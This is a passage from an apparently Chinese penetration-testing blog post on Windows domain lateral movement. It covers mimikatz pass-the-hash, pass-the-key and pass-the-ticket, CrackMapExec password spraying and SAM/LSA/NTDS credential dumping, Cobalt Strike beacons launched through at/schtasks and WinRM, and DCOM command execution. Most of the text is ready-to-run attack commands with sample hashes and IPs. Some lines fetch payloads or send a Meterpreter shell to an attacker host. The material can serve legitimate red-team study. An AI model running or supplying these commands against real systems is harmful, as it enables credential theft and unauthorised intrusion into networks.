<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:WIN-P6KD23KACIJ &#x2F;ntlm:04cea78fa35a5be51f4aee6375651e8a</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/27.png"></p>
<p>拷贝文件</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/28.png"></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://yoga7xm.top/2019/04/12/IPentest-domain3/">内网渗透–Hash 传递攻击</a></p>
<h1 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h1><p>需要存在补丁 kb2871997</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用minikatz获取aes256_hmac：</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line">传递连接：sekurlsa::pth &#x2F;user:mary&#x2F;domain:hsyy.com&#x2F;aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b </span><br></pre></td></tr></table></figure>



<h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">实现步骤：  </span><br><span class="line">1、生成票据 kekeo “tgt::ask &#x2F;user:mary &#x2F;domain:hsyy.com &#x2F;ntlm:518b98ad4178a53695dc997aa02d455c”  </span><br><span class="line">2、导入票据 kerberos::ptt [TGT_haha@HSYY.COM_krbtgt](mailto:TGT_haha@HSYY.COM_krbtgt)~hsyy.com@GOD.ORG.kirbi  </span><br><span class="line">3、查看凭证 klist  </span><br><span class="line">4、利用 net use 载入 dir \192.168.213.163\c$  </span><br></pre></td></tr></table></figure>



<h1 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h1><h2 id="认证登录"><a href="#认证登录" class="headerlink" title="认证登录"></a>认证登录</h2><ul>
<li>明文</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient -L &#x2F;&#x2F;192.168.10.173 -U Administrator</span><br></pre></td></tr></table></figure>

<ul>
<li>hash</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient.exe -hashes 00000000000000000000000000000000:04cea78fa35a5be51f4aee6375651e8a WIN-P6KD23KACIJ&#x2F;Administrator@192.168.10.173</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/29.png"></p>
<h2 id="空会话枚举"><a href="#空会话枚举" class="headerlink" title="空会话枚举"></a>空会话枚举</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient -N -U &quot;&quot; -L \\192.168.1.214</span><br></pre></td></tr></table></figure>



<h1 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># rpcclient -U &quot;&quot; -N 10.10.10.161 </span><br><span class="line">rpcclient $&gt;enumdomusers</span><br><span class="line"></span><br><span class="line"># rpcclient -U corp.pentest.lab&#x2F;administrator 10.10.10.161 </span><br></pre></td></tr></table></figure>



<h1 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h1><p><a target="_blank" rel="noopener" href="https://mpgn.gitbook.io/crackmapexec/getting-started/installation/installation-on-windows">https://mpgn.gitbook.io/crackmapexec/getting-started/installation/installation-on-windows</a></p>
<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.10.173 -u administrator -H 04cea78fa35a5be51f4aee6375651e8a -x ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/30.png"></p>
<p>powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -X &#39;$PSVersionTable&#39;</span><br></pre></td></tr></table></figure>

<p>bypass ASMI</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -X &#39;$PSVersionTable&#39;  --amsi-bypass &#x2F;path&#x2F;payload</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/31.png"></p>
<h2 id="cme网络扫描"><a href="#cme网络扫描" class="headerlink" title="cme网络扫描"></a>cme网络扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.0.0&#x2F;24</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/32.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --shares</span><br><span class="line">crackmapexec smb 192.168.10.83 -u airs-win7 -p aab+1s --shares</span><br><span class="line">crackmapexec smb 192.168.10.83 -u airs-win7 -H 04cea78fa35a5be51f4aee6375651e8a --shares </span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/33.png"></p>
<h2 id="枚举空会话"><a href="#枚举空会话" class="headerlink" title="枚举空会话"></a>枚举空会话</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 10.10.10.161 -u &#39;&#39; -p &#39;&#39;</span><br><span class="line">cme smb 10.10.10.161 --pass-pol</span><br><span class="line">cme smb 10.10.10.161 --users</span><br><span class="line">cme smb 10.10.10.161 --groups</span><br><span class="line"></span><br><span class="line">cme smb 10.10.10.178 -u &#39;a&#39; -p &#39;&#39; -shares</span><br><span class="line">cme smb 10.10.10.178 -u -p -shares</span><br><span class="line"></span><br><span class="line"># 以递归方式遍历所有共享s</span><br><span class="line">crackmapexec smb  -u  -p  -M spider_plus</span><br></pre></td></tr></table></figure>

<h2 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --sam  </span><br><span class="line">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --lsa</span><br><span class="line">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --ntds</span><br><span class="line">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --ntds vss</span><br></pre></td></tr></table></figure>

<h2 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h2><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/34.png"></p>
<h2 id="枚举远程目标上的活动会话"><a href="#枚举远程目标上的活动会话" class="headerlink" title="枚举远程目标上的活动会话"></a>枚举远程目标上的活动会话</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.0&#x2F;24 -u UserNAme -p &#39;PASSWORDHERE&#39; --sessions</span><br><span class="line">cme smb 192.168.1.0&#x2F;24 -u UserNAme -p &#39;PASSWORDHERE&#39; --shares</span><br></pre></td></tr></table></figure>

<h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>使用空格指定多个用户名 / 密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18</span><br><span class="line">cme smb 192.168.1.101 -u user1 -p password1 password2 password3</span><br></pre></td></tr></table></figure>

<p>通过文本指定字典</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.101 -u &#x2F;path&#x2F;to&#x2F;users.txt -p Summer18</span><br><span class="line">cme smb 192.168.1.101 -u Administrator -p &#x2F;path&#x2F;to&#x2F;passwords.txt</span><br></pre></td></tr></table></figure>

<p>找到密码后继续爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.101 -u &#x2F;path&#x2F;to&#x2F;users.txt -p Summer18 --continue-on-success</span><br><span class="line"></span><br><span class="line"># 一对一爆破</span><br><span class="line">cme smb 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-succes</span><br></pre></td></tr></table></figure>

<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><ul>
<li>域</li>
</ul>
<p>User/Hash</p>
<p>获取凭证如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.0&#x2F;24 -u UserNAme -H &#39;NTHASH&#39;</span><br><span class="line">cme smb 192.168.1.0&#x2F;24 -u UserNAme -H &#39;LM:NT&#39;</span><br><span class="line"></span><br><span class="line">cme smb 192.168.1.0&#x2F;24 -u Administrator -H &#39;13b29964cc2480b4ef454c59562e675c&#39;</span><br><span class="line">cme smb 192.168.1.0&#x2F;24 -u Administrator -H &#39;aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>本地认证</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0&#x2F;24 -u UserNAme -p &#39;PASSWORDHERE&#39; --local-auth</span><br><span class="line">#~ cme smb 192.168.1.0&#x2F;24 -u &#39;&#39; -p &#39;&#39; --local-auth</span><br><span class="line"></span><br><span class="line">#~ cme smb 192.168.1.0&#x2F;24 -u UserNAme -H &#39;NTHASH&#39; --local-auth</span><br><span class="line">#~ cme smb 192.168.1.0&#x2F;24 -u UserNAme -H &#39;LM:NT&#39; --local-auth</span><br><span class="line"></span><br><span class="line">#~ cme smb 192.168.1.0&#x2F;24 -u localguy -H &#39;13b29964cc2480b4ef454c59562e675c&#39; --local-auth</span><br><span class="line">#~ cme smb 192.168.1.0&#x2F;24 -u Administrator -H &#39;aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c&#39;</span><br></pre></td></tr></table></figure>

<p>爆破结果后如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SMB 192.168.1.101 445 HOSTNAME [+] HOSTNAME\Username:Password (Pwn3d!) </span><br></pre></td></tr></table></figure>

<h2 id="winRM"><a href="#winRM" class="headerlink" title="winRM"></a>winRM</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#~ cme winrm 192.168.1.0&#x2F;24 -u userfile -p passwordfile --no-bruteforce</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># use the latest release, CME is now a binary packaged will all its dependencies</span><br><span class="line">root@payload$ wget https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;CrackMapExec&#x2F;releases&#x2F;download&#x2F;v5.0.1dev&#x2F;cme-ubuntu-latest.zip</span><br><span class="line"></span><br><span class="line"># execute cme (smb, winrm, mssql, ...)</span><br><span class="line">root@payload$ cme smb -L</span><br><span class="line">root@payload$ cme smb -M name_module -o VAR&#x3D;DATA</span><br><span class="line">root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth</span><br><span class="line">root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares</span><br><span class="line">root@payload$ cme smb 192.168.1.100 -u Administrator -H &#39;:5858d47a41e40b40f294b3100bea611f&#39; -d &#39;DOMAIN&#39; -M invoke_sessiongopher</span><br><span class="line">root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION&#x3D;enable</span><br><span class="line">root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST&#x3D;192.168.1.63 LPORT&#x3D;4443</span><br><span class="line">root@payload$ cme smb 192.168.1.100 -u Administrator -H &quot;:5858d47a41e40b40f294b3100bea611f&quot; -M web_delivery -o URL&#x3D;&quot;https:&#x2F;&#x2F;IP:PORT&#x2F;posh-payload&quot;</span><br><span class="line">root@payload$ cme smb 192.168.1.100 -u Administrator -H &quot;:5858d47a41e40b40f294b3100bea611f&quot; --exec-method smbexec -X &#39;whoami&#39;</span><br><span class="line">root@payload$ cme smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --local-auth -M mimikatz</span><br><span class="line">root@payload$ cme mimikatz --server http --server-port 80</span><br></pre></td></tr></table></figure>



<h1 id="at、schtasks"><a href="#at、schtasks" class="headerlink" title="at、schtasks"></a>at、schtasks</h1><ul>
<li>at</li>
</ul>
<p>windows 版本 <strong>&lt; 2012</strong>，高版本中使用 schtasks 命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at [\computername] [[id] [&#x2F;delete] | &#x2F;delete [&#x2F;yes]]</span><br><span class="line">at [\computername] &lt;time&gt; [&#x2F;interactive] [&#x2F;every:date[,...] | &#x2F;next:date[,...]] &lt;command&gt;</span><br></pre></td></tr></table></figure>

<p>生成 smb beacon</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/35.png"></p>
<p>上传 smb beacon 文件</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/36.png"></p>
<p>添加任务计划</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell at \\192.168.10.173 10:51 c:\local-smb.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/37.png"></p>
<p>已运行，无法反弹，smb shell 的问题。</p>
<p>换成 web beacon，成功反弹。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/38.png"></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/at">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/at</a></p>
<ul>
<li>schtasks</li>
</ul>
<p>windows <strong>&gt;= 2012</strong></p>
<p><strong>schtasks create</strong></p>
<p>创建任务对应执行文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;sc &lt;scheduletype&gt; &#x2F;tn &lt;taskname&gt; &#x2F;tr &lt;taskrun&gt; [&#x2F;s &lt;computer&gt; [&#x2F;u [&lt;domain&gt;\]&lt;user&gt; [&#x2F;p &lt;password&gt;]]] [&#x2F;ru &#123;[&lt;domain&gt;\]&lt;user&gt; | system&#125;] [&#x2F;rp &lt;password&gt;] [&#x2F;mo &lt;modifier&gt;] [&#x2F;d &lt;day&gt;[,&lt;day&gt;...] | *] [&#x2F;m &lt;month&gt;[,&lt;month&gt;...]] [&#x2F;i &lt;idletime&gt;] [&#x2F;st &lt;starttime&gt;] [&#x2F;ri &lt;interval&gt;] [&#123;&#x2F;et &lt;endtime&gt; | &#x2F;du &lt;duration&gt;&#125; [&#x2F;k]] [&#x2F;sd &lt;startdate&gt;] [&#x2F;ed &lt;enddate&gt;] [&#x2F;it] [&#x2F;z] [&#x2F;f]</span><br><span class="line"></span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.213.163 &#x2F;ru &quot;SYSTEM&quot; &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr c:\user.bat &#x2F;F</span><br></pre></td></tr></table></figure>

<p><strong>schtasks run</strong></p>
<p>执行文件任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;run &#x2F;s 192.168.213.163 &#x2F;tn adduser &#x2F;i</span><br></pre></td></tr></table></figure>

<p><strong>schtasks delete</strong></p>
<p>删除执行文件任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;delect &#x2F;s 192.168.213.163 &#x2F;tn adduser &#x2F;f</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create</a></p>
<h1 id="sharpwmi"><a href="#sharpwmi" class="headerlink" title="sharpwmi"></a>sharpwmi</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\sharpwmi.exe login 192.168.10.1&#x2F;24 administrator aab+1s cmd whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/39.png"></p>
<p>cs 报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[-] Invoke_3 on EntryPoint failed.</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/40.png"></p>
<h1 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h1><p>通过 IP 扫描网络获取 bios 名称（计算机名）</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/41.png"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/42.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash$ sudo nbtscan -v -s : 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>

<ul>
<li>cs plugin</li>
</ul>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/43.png"></p>
<h1 id="winRM-1"><a href="#winRM-1" class="headerlink" title="winRM"></a>winRM</h1><p>WinRM（windows 远程管理）是 WS 管理协议的 Microsoft 实现，一种基于标准的 SOAP 协议，允许来自不同供应商的硬件和操作系统相互操作，能够对本地或远程的服务器进行管理，获得一个类似 Telnet 的交互式命令行 shell，以便降低系统管理员复杂的操作。</p>
<p>端口：HTTP(5985)、HTTPS SOAP（5986）</p>
<p>前提：凭证及权限</p>
<p>CS 中有 WinRM 模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrm：x86，通过 WinRM 来运行一个 PowerShell 脚本</span><br><span class="line">winrm：x64，通过 WinRM 来运行一个 PowerShell 脚本</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/44.png"></p>
<p>进入 winrm64 后，内容如下：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/45.png"></p>
<p>前提需要有认证，才可以横向进入，此处的认证获取可以通过内部撞库、历史 RDP 凭证等方式获取，内部撞库是拿已知的密码去尝试是否有复用密码，历史 RDP 凭证是如果管理员再内网通过 3389 登录后且记录了密码，可以通过获取历史 RDP 登录记录获取凭证。</p>
<p>如上图所示，已经拥有 192.168.1.214 的密码凭证，但不清楚 192.168.1.55 的凭证，此时可以尝试使用 192.168.1.214 的凭证。</p>
<p>监听器和会话按需选择，会话是当前的 beacon。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/46.png"></p>
<p>尝试运行，报错了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jump winrm64 192.168.1.55 test</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/47.png"></p>
<p>查看服务器端口情况，未开启 5985 端口。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/48.png"></p>
<p>可通过 winrm 命令开启 5985 端口，windows server 2008 默认 winrm 服务是启动的，但端口未开放，需要通过<code>winrm quickconfig -q</code> 或者 <code>winrm qc</code> 开启端口。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/49.png"></p>
<ul>
<li>开启 winRM 服务：</li>
</ul>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/50.png"></p>
<p>重新查看端口开放情况，5985 端口已打开。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/51.png"></p>
<ul>
<li>开启防火墙或关闭防火墙命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt;netsh advfirewall firewall set rule group&#x3D;&quot;Windows 远程管理&quot; new enable&#x3D;yes</span><br></pre></td></tr></table></figure>

<ul>
<li>使用 powershell 连接服务器</li>
</ul>
<p>需提前开启信任主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Set-Item wsman:\localhost\Client\TrustedHosts -value 192.168.1.* -Force</span><br><span class="line"># 这个命令需要再客户端执行，而不是再服务端执行</span><br><span class="line"></span><br><span class="line">或者用下面的命令</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;</span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator&gt; Enter-PSSession 192.168.1.55 -Credential administrator</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/52.png"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/53.png"></p>
<p>输入凭证，连接成功。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/54.png"></p>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-PSSession -ComputerName 192.168.1.55 -Credential (Get-Credential)</span><br><span class="line">Enter-PSSession 1</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/55.png"></p>
<p>通过 CS 操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt; jump winrm64 192.168.1.55 test</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/56.png"></p>
<p>成功返回 shell</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/57.png"></p>
<p>windows8、windows10、windows server 2012 及以上系统，WinRM 服务默认开启。</p>
<h2 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h2><p>kali上很好用的工具</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">GitHub - Hackplayers/evil-winrm: The ultimate WinRM shell for hacking/pentesting</a></p>
<h1 id="WinRS"><a href="#WinRS" class="headerlink" title="WinRS"></a>WinRS</h1><p>WinRS (Windows Remote Shell) 是一种远程管理工具，用于在 Windows 远程服务器上运行命令行命令。WinRS 使用 WinRM（Windows Remote Management）协议向远程计算机发送命令行请求。<br>WinRS 在 Windows Server 2008 及更高版本的操作系统中预安装，并且可以在 Windows 7 及更高版本的操作系统中启用。要使用 WinRS，您必须在远程服务器上启用 WinRM，并且在本地计算机上运行命令时必须使用管理员权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrs -r:192.168.1.55 &quot;cmd &#x2F;c ipconfig&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/58.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 端口复用下</span><br><span class="line">winrs -r:http:&#x2F;&#x2F;192.168.1.55 -u:administrator -p:aab+1s whoami</span><br><span class="line">winrs -r:http:&#x2F;&#x2F;192.168.1.55 -u:administrator -p:aab+1s cmd</span><br></pre></td></tr></table></figure>



<h1 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h1><p>DCOM 代表分布式组件对象模型（Distributed Component Object Model），它是一种 Microsoft 的分布式系统服务。它允许计算机上的应用程序通过网络连接和通信。DCOM 使开发人员能够从远程计算机上执行代码，并使应用程序之间的通信更为容易和灵活。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Get-ChildItem &#39;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\&#123;49B2791A-B1AE-4C90-9B8E-E860BA07F889&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/59.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; $a &#x3D; [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.1.55&quot;))</span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator&gt; $a.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;&#x2F;c hostname &gt; c:\fromdcom.txt&quot;,&quot;7&quot;)</span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator&gt; Get-Content \\192.168.1.55\c$\fromdcom.txt</span><br><span class="line">WIN-BVVD8VFVMPR</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/60.png"></p>
<h1 id="SCShell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h1><p><a target="_blank" rel="noopener" href="https://github.com/Mr-Un1k0d3r/SCShell">GitHub - Mr-Un1k0d3r/SCShell: Fileless lateral movement tool that relies on ChangeServiceConfigA to run command</a></p>
<h1 id="No445"><a href="#No445" class="headerlink" title="No445"></a>No445</h1><p><a target="_blank" rel="noopener" href="https://github.com/JDArmy/NO445-lateral-movement">GitHub - JDArmy/NO445-lateral-movement: command execute without 445 port</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.redteam101.tech/offensive-security/lateral-movement/shi-yong-scshell-jin-hang-heng-xiang-yi-dong">https://www.redteam101.tech/offensive-security/lateral-movement/shi-yong-scshell-jin-hang-heng-xiang-yi-dong</a><br><a target="_blank" rel="noopener" href="https://github.com/BlWasp/CME_cheatSheet">https://github.com/BlWasp/CME_cheatSheet</a><br><a target="_blank" rel="noopener" href="https://mpgn.gitbook.io/crackmapexec/">https://mpgn.gitbook.io/crackmapexec/</a><br><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/">https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/</a><br><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/">https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/</a><br><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a><br><a target="_blank" rel="noopener" href="http://www.kxsy.work/2022/02/14/nei-wang-shen-tou-zui-shi-yong-de-heng-xiang-yi-dong-zong-jie/">http://www.kxsy.work/2022/02/14/nei-wang-shen-tou-zui-shi-yong-de-heng-xiang-yi-dong-zong-jie/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gamewyd/p/6805595.html">https://www.cnblogs.com/gamewyd/p/6805595.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/15309006.html">https://www.cnblogs.com/zhengna/p/15309006.html</a><br><a target="_blank" rel="noopener" href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1937116">https://cloud.tencent.com/developer/article/1937116</a></p>
<h1 id="文章说明"><a href="#文章说明" class="headerlink" title="文章说明"></a>文章说明</h1><p>文章来源于：<a target="_blank" rel="noopener" href="https://lca.xlog.app/nei-wang-shen-tou-ji-chu">https://lca.xlog.app/nei-wang-shen-tou-ji-chu</a></p>
